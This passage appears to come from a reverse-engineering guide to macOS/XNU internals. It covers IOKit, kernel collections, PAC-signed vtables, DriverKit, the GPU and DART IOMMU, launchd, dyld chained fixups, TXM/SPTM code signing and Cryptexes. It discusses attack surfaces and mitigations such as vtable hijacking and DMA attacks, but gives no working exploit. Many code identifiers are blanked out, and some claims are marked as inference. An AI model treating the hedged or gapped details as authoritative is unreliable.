Device Tree into C++ ObjectsWhen the kernel boots, the hardware topology is described by the Flattened Device Tree (FDT). Unlike previous architectures where the FDT pointer might have been passed in a raw register, in the current XNU ABI, the FDT pointer is stored in the  field of the  structure, which is passed in  to the kernel entry point . IOKit's first major task is to hydrate this binary blob into a live graph of  objects.
The bootstrap process is driven by the  class (specifically  on Apple Silicon). The kernel parses the FDT. For every node in the tree (e.g., , , ), it instantiates an . These objects are attached to the  plane of the Registry. This plane represents the physical topology as reported by iBoot. Properties from the FDT (like , , ) are converted into , , or  objects and attached to the registry entries.Matching and Driver Loading:
Once the Registry is populated, IOKit begins the  phase (). IOKit iterates over the registry entries. It compares the  property (e.g., ) against the  dictionary defined in the  of every loaded driver.The Probe/Start Lifecycle: When a match is found, the driver's C++ class is instantiated.
: The driver verifies the hardware is actually present (rarely used on SoCs where hardware is static).: The driver initializes the hardware, maps MMIO regions, and registers interrupts.RE Focus: The "Missing" Hardware:
On Tahoe systems, empirical observation reveals gaps in the IORegistry compared to the raw Device Tree. The SPTM and TXM reserve specific hardware blocks (e.g., the Secure Storage controller or specific GPIO banks for privacy LEDs). While not explicitly documented as an SPTM feature, reverse engineering suggests that during the unflattening process, nodes corresponding to physical ranges reserved by the SPTM are omitted from the . This effectively makes secure hardware invisible to the OS, preventing the kernel from even attempting to map the MMIO registers for these protected blocks.7.1.2 Boot, System, and Auxiliary Kernel CollectionsGone are the days of loading individual  bundles directly from /System/Library/Extensions at boot. To optimize startup and enforce stronger integrity guarantees, macOS now uses .Boot Kernel Collection (BKC)The  is a large, prelinked Mach-O, delivered as an Image4 payload (commonly labeled ):All “essential” drivers required to:Initialize low-level hardware.Mount the root filesystem.Bring up enough of the graphics/console stack to start userland and show the boot UI.
All included kexts are prelinked against the kernel:Symbol resolution is performed at build-time.No relocations or link-edit work is needed in the early boot path.
The BKC is loaded by iBoot into a region managed by Kernel Integrity Protection (KIP) and the Secure Page Table Monitor (SPTM):The physical pages backing BKC code are tracked and locked down before XNU runs.Page-table entries mapping these frames are subject to SPTM policy: kernel attempts to make them writable or executable in unexpected ways can be blocked or cause a panic.This makes kernel text and core boot drivers effectively immutable from EL1, even if an attacker gains .System Kernel Collection (SystemKC)The  holds additional Apple-provided drivers that are not strictly required to mount root or start :Examples include Wi-Fi, Bluetooth, audio, and other device drivers.Like the BKC, SystemKC contents are:Signed by Apple and loaded from the immutable System volume.Covered by the same KIP/SPTM enforcement model once mapped.Auxiliary Kernel Collection (AuxKC)The  is the “expansion slot”:Apple-signed kexts that are treated as auxiliary (e.g. optional features, development-only drivers). (userland) is responsible for assembling and signing an Auxiliary KC based on currently-installed third-party drivers.It then asks the kernel to load this collection at runtime once the system is up enough to trust userland decisions.Verification and sealing:The kernel verifies the AuxKC’s signature.On Tahoe-era systems, this verification is tied into TXM / LocalPolicy:Policy must allow third-party kexts in the current boot configuration.The AuxKC’s provenance and contents must satisfy platform rules.Once accepted, the pages for the AuxKC are mapped and then “sealed”:Their mappings transition to code-like protections under SPTM.After sealing, they are enforced similarly to BKC/SystemKC code (immutable from the kernel’s own point of view).For reverse engineering and exploitation:Have stable offsets relative to the kernel slide once you know the collection layout.Live in regions that are protected early and rarely change at runtime.Are loaded later and can have randomized placement.Traverse kernel data structures (, KC descriptors) at runtime to find their base addresses.Account for the fact that their text regions are still covered by SPTM after sealing, even though they arrived late.7.1.3  PAC-signing of C++ Vtables () and The  class is the root of the IOKit inheritance hierarchy. In C++, dynamic dispatch is handled via —arrays of function pointers. Historically, attackers would overwrite the vtable pointer in an object to point to a fake vtable controlled by the attacker (vtable hijacking).In the arm64e architecture, Apple has fundamentally altered the C++ ABI for kernel code to mitigate this.The Signed Vtable Pointer:
In a standard C++ object, the first 8 bytes are the pointer to the vtable. In XNU on arm64e, this pointer is . Public Apple documentation states the salt is 0. However, implementations often use address-based salts to achieve diversity.
$$ \texttt{SignedPtr} = \texttt{PAC}(\texttt{VtableAddr}, \texttt{Key=APDA}, \texttt{Context}=0) $$The Signed Vtable Entries:
The function pointers  the vtable are signed using the  (Instruction Key A). The salt incorporates the entry's storage address and a hash of the mangled method name. This prevents moving entries between vtables.
When the kernel calls a virtual function (e.g., ), the compiler emits a specialized instruction sequence:LDR     x0, [x20]       ; Load the object pointer
LDR     x16, [x0]       ; Load the signed vtable pointer
AUTDA   x16, xzr        ; Authenticate Data Key A, Context = 0 (per docs)
LDR     x10, [x16, #0x18] ; Load the target function pointer from the vtable
BLRAA   x10, x16        ; Branch with Link, Authenticating Key A, Context = Vtable Address
Note the two-stage authentication: Authenticates that the vtable pointer is valid. If the pointer was overwritten,  becomes a canonical non-valid pointer. The function pointers  the vtable are also signed. The  instruction authenticates the function pointer (using the vtable address as context) and branches.
This creates a chain of trust:The Object trusts the Vtable Pointer (via ).The Vtable trusts the Function Pointers (via ).KIP/SPTM trusts the Vtable Memory (via code immutability).For a reverse engineer, this means that patching a vtable in memory is impossible (KIP/SPTM), and forging an object requires the ability to sign pointers with the —a capability that requires a "Signing Oracle" gadget, which BTI aims to eliminate.The introduction of DriverKit represents a strategic retreat for the XNU kernel. For decades, the kernel’s attack surface was effectively the sum of the core kernel plus every third-party driver loaded into the address space. A vulnerability in a Wacom tablet driver or a USB-to-Serial adapter was functionally identical to a vulnerability in the scheduler: both yielded  code execution.DriverKit bifurcates this model by moving hardware drivers into userland, executing as System Extensions (). While they look and feel like drivers to the developer (using a C++ subset similar to Embedded C++), architecturally they are unprivileged processes. In the Tahoe architecture, this isolation is not merely a sandbox; it is a hardware-enforced chasm guarded by the TXM and SPTM.7.2.1 Moving drivers to userland:  and Entitlement ChecksA  is an ordinary userland process (usually running as root but confined by a dedicated sandbox and entitlements). It has no direct access to the kernel’s task port and can only exercise kernel functionality via  interfaces that the kernel explicitly exposes.
When a  is matched and loaded (managed by ), the kernel instantiates a shadow object known as . This kernel-side object acts as the proxy for the userland driver. When the kernel needs to call a function in the driver (e.g., ), it calls a method on . serializes the arguments into a specialized Mach message format (distinct from standard MIG). The message is sent to the  process. The DriverKit runtime (linked into the ) deserializes the message and invokes the implementation of the  subclass in userland.The  Interface:
Conversely, when the  needs to talk to the kernel (e.g., to register an interrupt handler or map memory), it cannot call kernel APIs directly. It uses . The  can only invoke a specific subset of kernel functionality exposed via  traps. These traps are heavily scrutinized. Interrupts are no longer handled via ISRs (Interrupt Service Routines) in the driver. Instead, the kernel handles the physical IRQ, masks it, and dispatches an  event to the  via a Mach notification. This eliminates the entire class of vulnerabilities related to interrupt context safety and spinlock deadlocks in third-party code.Entitlements as the Gatekeeper (TXM Enforcement):
In Tahoe, the ability of a  to bind to specific hardware is governed by . A  cannot simply  any MMIO region. It must possess specific entitlements (e.g., com.apple.developer.driverkit.transport.usb) to access specific device families. When  launches a , the system verifies its signature and entitlements against LocalPolicy and trust caches. On SPTM/TXM-equipped systems, these checks are enforced below XNU, so a compromised  cannot bypass them. If the TXM returns a failure, the kernel refuses to establish the  link, and the driver fails to start.RE Focus: The  Metaclass:
Reverse engineering a  requires understanding the  infrastructure in userland. The  binary contains  information that describes the RPC interface. By parsing the  sections, one can reconstruct the vtables and the mapping between the kernel-side dispatch IDs and the userland C++ methods.7.2.2 Memory Mapping Constraints and IOMMU (DART) ProtectionThe most dangerous capability of a driver is Direct Memory Access (DMA). A malicious or buggy driver could program a peripheral (like a GPU or Network Card) to write data to physical address  (or wherever the kernel text resides), bypassing CPU-enforced protections like KTRR.To mitigate this, Apple Silicon employs a pervasive IOMMU architecture known as DART (Device Address Resolution Table).
Every DMA-capable peripheral on the SoC sits behind a DART. The device does not see Physical Addresses (PA); it sees I/O Virtual Addresses (IOVA). The DART translates IOVA → PA, enforcing permissions (Read/Write) at the page level. When a  allocates a buffer for DMA, it creates an . The  calls IOMemoryDescriptor::CreateMapping. This triggers a call into the kernel. The kernel allocates physical pages () and pins them. The kernel programs the DART associated with the specific hardware device controlled by the . It maps the physical pages to an IOVA range visible to that device.The Tahoe/SPTM Enforcement:
In the Tahoe architecture, the kernel is no longer trusted to program the DARTs directly. If the kernel could write to DART registers, it could map the kernel's own text segment as writable to the GPU, then tell the GPU to overwrite it (a DMA attack). The physical pages containing the DART translation tables (or the MMIO registers controlling the DART) are typed as  or a specific hardware-protected type in the Frame Table.The  Selector: When the kernel needs to map a buffer for a , it issues a  call to the SPTM. The SPTM verifies that the physical pages being mapped are  by the  (or are valid shared memory). It strictly forbids mapping any page typed , , or  into a DART. The SPTM performs the write to the DART hardware.MMIO Mapping Restrictions:
Similarly, when a  needs to control hardware registers (MMIO), it requests a mapping.The kernel cannot simply map physical device memory into the 's address space. The SPTM only honors MMIO mapping requests that target ranges it recognizes as device registers for the given driver or device; ranges associated with secure components (SEP, KTRR controller) are excluded.This ensures that a USB driver can  map the USB controller's registers, and cannot map the registers for the Secure Enclave Mailbox or the KTRR controller.
Exploiting a  to gain kernel privileges is exponentially harder in Tahoe. Even if you gain code execution in the  (Userland), you cannot issue arbitrary syscalls (sandbox), you cannot map kernel memory (VM isolation), and you cannot use the hardware device to perform DMA attacks against the kernel (SPTM-enforced DART). The attacker is contained within a hardware-enforced cage, limited to the specific capabilities of that one peripheral.7.3 The Graphics Stack (AGX)If the XNU kernel is the central nervous system, the  stack is a secondary, alien brain grafted onto the SoC. On M-series silicon, the GPU is not merely a peripheral; it is a massive, autonomous compute cluster running its own proprietary operating system, managing its own memory translation, and executing a command stream that is almost entirely opaque to the main OS.For the reverse engineer, AGX represents the largest and most complex attack surface in the kernel. The driver () is enormous, the firmware is encrypted (until load), and the hardware interface is undocumented. In the Tahoe architecture, Apple has moved to aggressively sandbox this beast, wrapping the GPU's memory access in strict DART (Device Address Resolution Table) policies enforced by the SPTM to prevent DMA-based kernel compromises.7.3.1 RTKit: The Proprietary RTOS running on the GPU Coprocessor (ASC)The GPU does not execute driver commands directly. Instead, the M-series SoC includes a dedicated Apple Silicon Coprocessor (ASC)—typically a hardened ARMv8-R or Cortex-M class core—that manages the GPU hardware. This coprocessor runs , Apple’s proprietary Real-Time Operating System.
The kernel driver does not contain the logic to drive the GPU hardware registers directly. Instead, upon initialization (), it loads a firmware payload from a firmware bundle on disk or embedded in the kext. The firmware is a standard Mach-O binary, often multi-architecture. It contains  and  segments just like a userland program. Reverse engineering the firmware reveals a microkernel architecture. It has a scheduler, an IPC mechanism, and a set of "Endpoints" (services).
Communication between the XNU kernel () and the ASC () occurs via a shared memory mailbox protocol. The AP writes to a specific MMIO register to ring the doorbell of the ASC. The message payload is placed in a shared memory ring buffer. The protocol is endpoint-based. Reverse engineering identifies specific service IDs running on the ASC, such as:
 Power Management (Voltage/Clock gating). Graphics Rendering (Command submission). Compute (GPGPU/Metal).RE Focus: The  State Machine:
The  contains extensive logging strings and state tracking for RTKit. By analyzing the  class in the kext, one can reconstruct the message structures. When the GPU hangs, RTKit writes a "Coredump" to a shared buffer. The kernel captures this. Analyzing these logs reveals the internal memory layout of the ASC and the state of the GPU pipeline at the time of the crash. Historically, vulnerabilities existed where the kernel could send malformed IPC messages to the ASC, causing memory corruption  the GPU firmware. While this doesn't directly yield Kernel R/W, compromising the ASC allows an attacker to use the GPU as a confused deputy for DMA attacks (see 7.3.3).While  handles rendering,  (IOMFB) handles the display controller (DCP). This driver is responsible for the "Swap Chain"—taking the rendered frames and scanning them out to the display panel.The Unified Memory Architecture (UMA):
On Apple Silicon, the Framebuffer is just a region of system DRAM.  (userland) renders into an . The physical pages backing this surface are passed to IOMFB, which programs the Display Coprocessor (DCP) to read from them.The Security Criticality:
IOMFB is a high-value target because it handles complex shared memory structures () mapped into both the kernel and userland (). The  method and external methods of IOMobileFramebufferUserClient have historically been riddled with race conditions and bounds-checking errors.Tahoe and the "Secure Overlay":
In the Tahoe architecture, IOMFB's control over the display is no longer absolute. To support the Hardware Privacy Indicators (Green/Orange dots), reverse engineering suggests the display pipeline has been bifurcated. Managed by IOMFB/WindowServer. Draws the desktop/apps. Managed by an . Draws the privacy indicators.
The compositing of these two pipes happens in the display hardware, not in memory.The Exclave owns a small, reserved framebuffer region.The Display Controller overlays this region on top of the standard framebuffer . Because the Secure Pipe's framebuffer memory is owned by the Exclave (and protected by the SPTM), neither the kernel nor the GPU can write to it. This guarantees that if the camera is on, the green dot  be visible, even if the kernel is compromised.7.3.3 DART: The IOMMU Wall and DMA ContainmentThe GPU is effectively a DMA engine with the capability to read and write vast swathes of system memory. Without restriction, a compromised GPU firmware (or a malicious shader exploiting a GPU hardware bug) could overwrite kernel text or page tables.To prevent this, the AGX hardware—and indeed every DMA-capable peripheral on the Apple Silicon SoC—sits behind a strict IOMMU known as the DART (Device Address Resolution Table).DART Architecture and Stream IDs (SIDs):
The DART translates Device Virtual Addresses (DVA) used by the peripheral into  in DRAM. However, the translation is not monolithic; it is segmented by the source of the traffic. Every transaction on the SoC's Network-on-Chip (NoC) carries a hardware-generated Stream ID identifying the initiator (e.g., GPU Firmware, Vertex Fetcher, Display Controller). The DART maintains multiple translation contexts (similar to distinct  roots). The DART hardware is configured to map specific SIDs to specific Context Banks. This allows isolation between different workloads on the same peripheral (e.g., isolating  rendering commands from a background compute shader).The Tahoe Enforcement (SPTM):
In pre-Tahoe systems, the kernel ( or ) managed the DART page tables and the SID configuration registers directly. This meant a kernel attacker could disable DART, remap SIDs to privileged contexts, or map kernel memory into the GPU's address space to bypass KTRR.In Tahoe, DART management is privileged to the SPTM. The physical pages containing the DART translation tables (L1/L2 TTEs) and the MMIO registers controlling SID configuration are typed as  (or a specific IOMMU_TABLE type) in the Frame Table. When  needs to map a user's  for GPU access:
It issues a  call (Selector ).It passes the DART ID, the Context ID, the DVA, and the PA. The SPTM verifies:
The PA is valid  (not Kernel Text, not Page Tables).The DART ID corresponds to the GPU. Crucially, the SPTM enforces the immutable binding between SIDs and Contexts. It ensures that the kernel cannot reconfigure the DART to allow an untrusted SID (e.g., the Neural Engine) to write to a Context Bank reserved for the Secure Enclave or Display Pipe. The SPTM writes the DART PTE.RE Focus: The "GART" Attack Surface:
Despite SPTM protection, the logic  the mapping still resides in the kernel. Can the kernel trick the SPTM into mapping the same physical page to two different DART contexts with different permissions? Does the SPTM correctly flush the DART TLB () immediately after unmapping? If not, the GPU might retain access to a page that has been freed and reallocated to the kernel, leading to a Use-After-Free via DMA. The DART configuration registers (e.g., , , and SID match registers) are trapped by the hardware to GL2. Attempting to write to the DART control base address from EL1 should trigger a synchronous exception. Reverse engineering the  class in IOKit will reveal the specific  trampolines used to bridge these operations.8.0 Userland Bootstrap: The Birth of PID 1The initialization of the XNU kernel culminates in mounting the root filesystem (the Signed System Volume) and creating the first userland process. In traditional UNIX systems, this is  (PID 1). On macOS, this role is fulfilled by . is not just a SysV-style init. It is:The  that manages the lifecycle of daemons and agents.The , providing the string-to-port name service for most of userland.A central  for IPC visibility and service availability.In the Tahoe architecture,  is also the first long-lived user process to run under the full scrutiny of the Trusted Execution Monitor (TXM) and associated integrity mechanisms. Its successful launch marks the handoff from the measured, firmware-controlled boot world to the userland environment.8.1 : The Mach Port BrokerThe transition from kernel mode to user mode is effectively one-way for the thread that becomes PID 1: once it crosses into userland, it never returns to the kernel in its original identity.After early initialization in  (mounting root, bringing up the BSD subsystem), the kernel:Spawns a special kernel thread (often referred to conceptually as the ).Uses  to:Allocate  (PID 1) and its backing .Load the  Mach-O binary into that task via . becomes the root of the userland process tree.All subsequent processes are, ultimately, descendants of PID 1.’s management of Mach ports and bootstrap namespaces becomes the primary mechanism by which services discover each other and enforce IPC-based policy.8.1.1 Transition from Kernel to Userland: The First The kernel routine  (in ) orchestrates the end of early boot:
It ensures the Signed System Volume is mounted and ready.PID 1 construction ( / ):
The kernel:Creates  as PID 1 by cloning from the kernel’s internal template process, with special flags ().Allocates the corresponding  and thread structures. – kernel-side  of :
Instead of a user process calling execve("/sbin/launchd", ...), the kernel:Loads the Mach-O for  (backed in modern systems by the OS Cryptex, even though the path appears as ).Constructs the initial user address space:Sets up the initial user thread state (PC, stack, registers) as if an  had just succeeded.Trust and integrity checks (conceptual model):
On Tahoe systems:The code signature and CDHash of  are validated against the Static Trust Cache and platform policy.TXM/SPTM participate in ensuring that:Only a measured, signed  binary becomes PID 1.Its text pages are mapped in a way that respects kernel integrity protection (no ad-hoc remapping to writable/executable later without violating SPTM policy).The exact firmware call sequence is implementation detail, but the net effect is: if  is not exactly the expected, signed binary, the system does not proceed into userland.As part of bringing up the userland environment:The system needs a trusted process that can:Talk to host-level interfaces (, etc.).Manage systemwide services and kext/kc configuration. is that process. During or shortly after PID 1 construction:The kernel ensures that  can obtain the  () by:Providing a host send right via initial special ports, orAllowing  to call host_get_host_priv_port() successfully.Subsequent privileged daemons (e.g. ) obtain their own host-level capabilities via -mediated configuration or direct  calls, subject to entitlements. is therefore the first userland holder of host-level control needed to configure the rest of the system, but it is not necessarily the only holder for the entire lifetime of the OS.8.1.2 Initializing the Bootstrap Port (Subset of the Name Service)Mach does not provide any built-in string-based name service. Name→port mappings are implemented in userland by the bootstrap server, which on macOS is .Bootstrap port assignmentEvery task in XNU has a special port slot, . For PID 1:When  is created, the kernel associates a bootstrap server port with ’s .For child processes spawned by , this slot is:Inherited from the parent, orReplaced with a more restricted bootstrap port representing a subset namespace (e.g. per-user or per-session domain).From userland’s perspective: in the  APIs (and the default XPC bootstrap connection) is whatever send right is stored in .Namespace hierarchy (domains)Modern  organizes the bootstrap namespace into , which correspond roughly to what  exposes as specifiers: – The system-wide daemon domain (LaunchDaemons, root services). – Per-UID domains for LaunchAgents. – GUI domains for interactive sessions per user. or  – Per-login/per-ASID domains for specific authenticated sessions.Its own subset of registered service names.Its own set of policies controlling access and visibility.All of these domains ultimately terminate in the same PID-1  process, but they appear as distinct bootstrap ports and namespaces from the point of view of tasks.The bootstrap port in practiceWhen a daemon is launched, it typically:Receives a bootstrap port (for its domain) in its .bootstrap_check_in(bootstrap_port,
                   "com.apple.locationd",
                   &service_port);
 receives this message on the appropriate domain’s bootstrap port and:Verifies, via the audit token, that the caller is the process associated with the job for .Transfers the receive right for the pre-allocated service port into the daemon’s IPC space.Use  or xpc_connection_create_mach_service() on  bootstrap port. resolves the name in the caller’s domain and either:Returns a send right to the service port, orFails with an error if the service does not exist or is not visible in that domain.Implements the lazy, on-demand launch of services.Enforces which names exist and are reachable in each domain, with  as the central broker.8.1.3 Parsing  and the Binary Protocol for XPC Service Lookups’s configuration is driven by property lists () describing jobs, located under:/System/Library/LaunchDaemons/System/Library/LaunchAgentsPer-user equivalents under At startup (and when configuration changes),  parses these plists once and compiles them into an internal data structure representing:Jobs (labels, binaries, arguments, environments).Their target domain (system/user/gui/login).Policy metadata (KeepAlive, RunAtLoad, sockets, etc.).The  dictionaryA typical job might include:<key>MachServices</key>
<dict>
    <key>com.apple.securityd</key>
    <true/>
</dict>
Allocate a Mach receive right for  when loading the job.A client first looks up , andThe job has started and checked in.The mapping "com.apple.securityd" → (job, receive-right).Which domain that name belongs to.Demand launching (lazy activation)The common path for a client is:xpc_connection_t conn =
    xpc_connection_create_mach_service("com.apple.securityd",
                                       dispatch_get_main_queue(),
                                       0);
 sends a message to the caller’s bootstrap port asking for .Looks up  in the caller’s domain.If the job is not running:Spawns the configured binary via .Waits for the daemon to call .When the daemon calls : confirms the caller matches the job.Transfers the receive right for the service port into the daemon’s IPC space.Returns a send right to the client.From the client’s perspective, the detail is hidden: it just sees an XPC connection that becomes ready.Binary protocols: MIG vs XPC exposed a MIG-based API defined in , including:These are still present and supported.Modern userland prefers , which:Packages requests into binary dictionaries and sends them over Mach ports.Allows richer types (arrays, dictionaries, file descriptors, additional Mach ports) to be transported in a structured way.A central Mach receive loop demultiplexes incoming messages:MIG messages (identified by the Mach message ID) are routed to autogenerated handlers from .XPC messages (identified by XPC magic/version fields in the payload) are parsed into XPC objects and dispatched to XPC-specific handlers (job control, service lookup, status queries).On Tahoe-era systems, the bootstrap namespace is also used as a policy boundary:The kernel attaches an audit token to each Mach message, including:PID, UID, GID, ASID, and other identity information.The caller’s entitlements and sandbox profile (when available).It enforces constraints such as:Only processes with appropriate  entitlements can resolve certain global services.Sandboxed apps see only a restricted subset of services in their effective bootstrap domain.The bootstrap namespace is not just a  from string to port.It is also a , with  acting as the enforcement point that decides which ports a given client is even allowed to know exist.8.2 The Dynamic Linker ()If  is the architect of the userland process hierarchy,  (the dynamic linker) is the component that materializes each process image. In the macOS ecosystem,  is not merely a library loader; it is a privileged extension of the kernel’s execution model, responsible for:Loading the main executable and its dependent images.Enforcing  policies.Applying Address Space Layout Randomization (ASLR).On arm64e, integrating with Pointer Authentication (PAC).On Apple Silicon and in the Tahoe architecture,  has been heavily reworked. Legacy rebasing mechanisms have been replaced with  to enable page-in linking, and ’s decisions are tightly coupled with the kernel’s memory management, which itself is constrained by the Secure Page Table Monitor (SPTM).8.2.1 Mapping the Dyld Shared Cache (DSC)The  is a defining feature of the macOS userland memory layout. It is a massive, pre-linked binary (often >4 GiB) that merges the text and data segments of most system frameworks (, , , etc.).To optimize memory and TLB usage, the kernel reserves a  in every process:On arm64, this region typically begins at a high canonical address (e.g., around  in current releases).The DSC is mapped into this region, and the backing physical pages are shared across all processes.To satisfy  and fine-grained data protection, the DSC is split into multiple mappings:
Immutable code and constant data that must never be written at runtime.
Read-only data that can be pre-relocated at build time and never changes at runtime (e.g., constant pointers, vtables).
Data that must diverge per process (e.g., Objective-C class realization state, global variables).The Tahoe/SPTM Constraint:On Tahoe systems, the mapping of the DSC is mediated by SPTM:
The DSC binaries and associated metadata reside in the , typically under:/System/Cryptexes/OS/System/Library/dyld/

When XNU initializes the shared region, it installs page tables for the DSC segments in each process’s address space. On SPTM-enabled systems:Each PTE change for DSC pages is vetted by SPTM.The physical frames backing  are associated with a “immutable code” state; once mapped, they are not permitted to transition to writable mappings under EL1 control alone.Immutable Code under a Compromised Kernel:
Because SPTM operates at a higher privilege level than the kernel:Arbitrary EL1 writes cannot simply flip the DSC  pages to .Any attempt to create new executable mappings for code that has not been validated by TXM can be blocked by SPTM when the Execute bit is requested.Practically, this means traditional techniques that patch system libraries in-place from a kernel exploit are structurally constrained. Attackers must rely on indirection (e.g., hooks via , PLT-style trampolines, or userland injecting new, separately validated images) rather than overwriting shared-cache code directly.8.2.2  Code Signature Validation () and the Call to TXM is the primary enforcer of  for userland. The OS policy is:A process can only execute code that has been validated by the platform’s code-signing machinery, and for hardened processes, only from binaries signed by Apple or by the same Team ID as the main executable.When  loads a Mach-O image, either during initial process launch or via , the high-level flow is:
The file is mapped into the address space with appropriate protections (typically at least readable, but not yet executable).Signature Registration via : calls:struct fsignatures fs;
fcntl(fd, F_ADDFILESIGS_RETURN, &fs);
The  structure informs the kernel where the code-signature blob (CMS) resides in the file and requests that this file be authorized for executable mappings.On older architectures, the kernel (plus AMFI) parsed and validated the CMS blob in EL1. On Tahoe systems, validation is mediated by TXM, and enforcement by SPTM.Conceptual Kernel → TXM Flow:
The kernel identifies the physical frames that contain:The Mach-O Code Directory.The CMS code-signature blob.Secure Monitor Invocation:
The kernel issues a secure call into TXM (e.g., via a -style transition), passing:References to those frames.Metadata for the code-signing request (team identifier, flags, platform binary vs third-party, etc.).
Inside TXM:The CMS blob is parsed and the signature chain is validated against:The  (for platform binaries shipped with the OS/Cryptexes), orApple’s CA hierarchy (for third-party code).Policy constraints are applied (e.g., hardened runtime flags, entitlements, revocation status).Verdict and SPTM Tagging:
TXM returns a verdict to the kernel. If the code is accepted:SPTM is updated with metadata that associates the relevant CDHash and physical frames with a “blessed for execution” state.Page-Fault-Time Enforcement:
When the process later executes into that image:The first access to a given code page triggers a page fault.The kernel attempts to install an executable PTE for that frame.SPTM intercepts the attempt and checks:Whether the frame was previously “blessed” by TXM for this CDHash.If the check fails, the mapping is refused and the process is terminated (e.g., with SIGKILL | Code Signature Invalid).The exact internal data structures and opcodes used between kernel, TXM, and SPTM are firmware implementation details. From the perspective of , the observable behaviour is that  can succeed or fail, and that executing unblessed code results in immediate termination, independent of kernel cooperation.
When a process dies immediately after  or after loading a plugin/framework, and  reports code-signature errors, the proximate userland symptom is often a failed fcntl(F_ADDFILESIGS_RETURN) or an immediate crash on first execution into the library. The authoritative reason (revoked certificate, missing trust-cache entry, policy violation) lives in TXM/SPTM logs and kernel log events, which may be partially redacted on production builds.8.2.3 ASLR in Userland: Chained Fixups and the Death of Modern  (dyld 4.x and later) on Apple Silicon has effectively deprecated the legacy  rebasing/binding opcodes in favour of  (). This transition is not just a performance optimization; it is a fundamental change to how relocation metadata is encoded, tightly integrating ASLR and, on arm64e, PAC.Limitations of Legacy Rebasing:The previous model stored relocation metadata as a stream of opcodes (, ) that described where in  to add the ASLR slide and how to bind imports. At launch,  walked these opcode streams and:Touched every page that contained a relocatable pointer.Dirtying pages that might never be read, impacting both memory footprint and cache behaviour.Chained Fixups: On-Disk Representation:In the chained fixup model, on-disk “pointers” in the  segments are actually . For each image: points to a dyld_chained_fixups_header.This header references a dyld_chained_starts_in_image structure, which contains:Per-segment start tables (dyld_chained_starts_in_segment), andFor each participating segment, an array giving the offset of the first fixup in each 16 KiB page (or  if the page has none).At each fixup location, the file contains a 64-bit encoded value such as dyld_chained_ptr_64_rebase or :The  delta (in 4-byte units) to the next fixup in the same page.The  (either an offset into  for rebasing or an ordinal into the import table for binding).For arm64e, authentication flags and diversity bits.A  value of  terminates the chain for that page.Page-In Linking (Lazy Fixups):With chained fixups,  no longer performs a global sweep at launch:
The image is mapped into memory with its  and  segments, but most  pages have not yet been faulted in.First Access / Page Fault:
When the process first reads or writes through a pointer in  that resides on a page with chained fixups:A page fault is triggered.The kernel or a user-mode handler notes that this page has pending fixups.
The fixup logic:Consults the per-page start offset from dyld_chained_starts_in_image.Walks the chain by following  deltas until the chain terminates.
For each encoded “pointer”:The  is interpreted as:A  offset to be combined with the ASLR slide (for rebasing), orAn import ordinal resolved to a symbol address (for binding).On arm64e, the final pointer is authenticated:PAC( Base + Offset, Key, Context/Discriminator ) is computed using process-specific PAC keys.The 64-bit metadata word on the page is overwritten with the final, signed, slid pointer.
The page is now dirty (because the encoded metadata was overwritten), but only the pages that are actually accessed incur this cost.PAC Integration ():On arm64e, fixup entries use formats like  and DYLD_CHAINED_PTR_ARM64E_AUTH_*:Key selection (instruction/data key). computes PAC for each pointer at fixup time:The pointer is valid only under the current process’s PAC keys.Attempts to transplant the pointer into another process or mutate the context bits will cause PAC failures at use.ASLR and PAC are therefore coupled at the moment a page is faulted in and its fixups applied.Reverse-Engineering Implications:For reverse engineers, chained fixups fundamentally alter the static picture of binaries:Raw on-disk  segments no longer contain meaningful absolute pointers; they contain encoded metadata words.Naive disassembly or CFG reconstruction that ignores chained fixups will see “garbage” addresses and broken callgraphs.Correct analysis requires simulating ’s fixup engine to compute the final pointers.Parse  and the associated structs.Walk chains on a per-page basis.Optionally write a “de-chained” view of the file for analysis. and related tooling can emit a fixed-up view of Mach-O binaries extracted from DSCs.Apple’s  (and its open-source analogues) can extract and apply fixups to DSC residents.Recent versions of IDA Pro and Ghidra detect  and apply fixups within the analysis database, even though the on-disk file remains in its chained form.8.3 Cryptexes (Cryptographic Extensions)The introduction of the Signed System Volume (SSV) in macOS Big Sur solved the problem of persistence: by anchoring the root filesystem in a cryptographic hash verified by iBoot, Apple ensured that the core OS partition is immutable. However, this immutability created an operational problem: patching a single high-level component (for example,  or WebKit) would require resealing and redistributing the entire SSV.To resolve the tension between  and , Apple introduced  (Cryptographic Extensions). A Cryptex is a cryptographically sealed, versioned filesystem image that can be mounted and “grafted” into the system hierarchy at boot or runtime. In the Tahoe architecture, Cryptexes are the primary mechanism for the  design, decoupling the kernel/BSD and low-level system from rapidly evolving userland components.8.3.1 The “Split OS” Architecture: In modern macOS, the logical root filesystem () is effectively a skeleton:it contains the sealed snapshot of the kernel and core boot artifacts on the SSV, andit carries just enough structure to support bootstrapping.The bulk of high-level userland—, , system frameworks, many daemons—resides in the .A Cryptex is distributed as an :
A disk image (typically APFS) containing a filesystem hierarchy.
A signed metadata blob that binds the payload to Apple’s root keys. For some Cryptexes, the manifest can be  (tied to ECID, board, and security domain), preventing naive replay of mismatched OS components onto other devices.Cryptexes are not mounted via a user-visible  call. They are integrated into the system by early boot code and the APFS driver:
iBoot locates the OS Cryptex image (commonly on the Preboot volume), validates the  signature against hardware-anchored keys, and arranges for the payload to be visible to the kernel.
Inside the Cryptex, a binary trust cache (for example, ) lists CDHashes for all executable content in that Cryptex.
Before the filesystem is grafted, this trust cache is provided to TXM. TXM verifies its signature and, on success, merges the hashes into the platform’s Static Trust Cache for that boot.APFS grafting / firmlinks:
The APFS driver performs a graft operation that logically attaches the Cryptex under:and uses  or equivalent redirections so that paths like:/usr/lib/libSystem.B.dylib
/System/Library/Frameworks/CoreFoundation.framework/...
are transparently resolved into the OS Cryptex, even though the SSV copy of  and  is skeletal.From a reverse-engineering perspective, the “real” binaries of interest (current , system frameworks, many daemons) live under . Paths under  or  may be firmlinked views pointing back into this Cryptex.8.3.2 Rapid Security Response (RSR): Patching via Overlay CryptexesThe Cryptex mechanism enables Rapid Security Response (RSR): security updates that patch critical components without requiring a full OS update or resealing of the SSV.An RSR is delivered as an additional Cryptex:it usually contains only the components that changed (for example, updated dyld shared caches or WebKit frameworks),it ships with its own Image4 manifest and trust cache, validated similarly to the base OS Cryptex.
The  daemon orchestrates download, local verification, and placement of the new Cryptex image (typically onto the Preboot volume), and updates boot policy so early boot components know it exists.Verification and trust cache update:
During boot, the RSR Cryptex’s manifest is verified. Its embedded trust cache is ingested by TXM so that binaries from the RSR are eligible for execution.Overlaying the OS Cryptex:
